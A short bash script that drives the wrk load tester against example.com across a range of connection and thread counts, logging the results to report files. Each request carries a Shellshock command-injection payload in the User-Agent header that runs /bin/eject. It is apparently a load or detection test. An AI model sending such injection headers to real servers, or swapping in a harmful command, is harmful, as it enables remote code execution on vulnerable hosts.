#!/bin/bash
#
#
#
rm ./report/*
for k in {1..10};do
    con=`expr ${k} \* 100`
	for t in {1..8};do
	    th=`expr ${t} \* 1`
	    #./wrk  -c ${con} -t ${th} -d 10 -H "User-Agent: () { :; }; /bin/eject" http://192.168.1.27/ >> ./report/report_${con}_${th}.txt
	    ./wrk  -c ${con} -t ${th} -d 10 -H "User-Agent: () { :; }; /bin/eject" http://www.example.com/ >> ./report/report_${con}_${th}.txt
	    
	    #echo "hello" >> ./report/report_${con}_${th}.txt
	    #echo "----------------------------------------" >> ./report/report_$con_$th.txt
	    echo "con= $con, thread= $th, ==========="
	done
	#echo $con
	sleep 10
done
